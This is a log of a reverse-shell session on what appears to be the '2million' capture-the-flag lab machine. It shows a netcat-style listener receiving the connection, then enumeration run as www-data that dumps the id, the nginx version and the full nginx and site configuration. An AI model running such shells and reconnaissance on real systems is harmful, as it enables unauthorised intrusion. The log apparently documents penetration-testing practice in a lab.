@@ -1,0 +1,79 @@
+Listening on 0.0.0.0 9005
+Connection received on 10.129.148.45 38006
+bash: cannot set terminal process group (1092): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$ <nabled/; cat /etc/nginx/sites-enabled/*; echo MARKN
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+nginx version: nginx/1.18.0 (Ubuntu)
++++-==============-==================-============-==========================================
+ii  nginx          1.18.0-6ubuntu14.3 amd64        small, powerful, scalable web/proxy server
+===CONF===
+user www-data;
+pid /run/nginx.pid;
+#error_log /dev/stderr info;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    server_tokens off;
+    #log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
+    #access_log /dev/stdout docker;
+
+    charset utf-8;
+    keepalive_timeout 20s;
+    sendfile on;
+    tcp_nopush on;
+    client_max_body_size 1M;
+    include /etc/nginx/mime.types;
+
+    server {
+        listen 80 default_server;
+        listen [::]:80 default_server;
+
+        return 301 http://2million.htb$request_uri;
+    }
+
+    include /etc/nginx/sites-enabled/*;
+}
+===SITES===
+default
+server {
+    listen 80;
+    server_name 2million.htb;
+
+    root /var/www/html;
+
+    index index.php index.html index.htm index.nginx-debian.html;
+
+    error_page 404 = @notfound;
+
+    location / {
+        try_files $uri $uri/ /views$uri /index.php?$args;
+    }
+
+    location @notfound {
+        #try_files /views/404.php =404;
+        fastcgi_pass unix:/run/php/php-fpm.sock;
+        fastcgi_param SCRIPT_FILENAME $document_root/views/404.php;
+        include fastcgi_params;
+        fastcgi_intercept_errors off;
+        return 301 /404;
+    }
+
+    location = /.env {
+        deny all;
+        return 404;
+    }
+
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_intercept_errors on;
+        fastcgi_pass unix:/run/php/php-fpm.sock;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        include fastcgi_params;
+    }
+}
+MARKN
+www-data@2million:~/html$ 
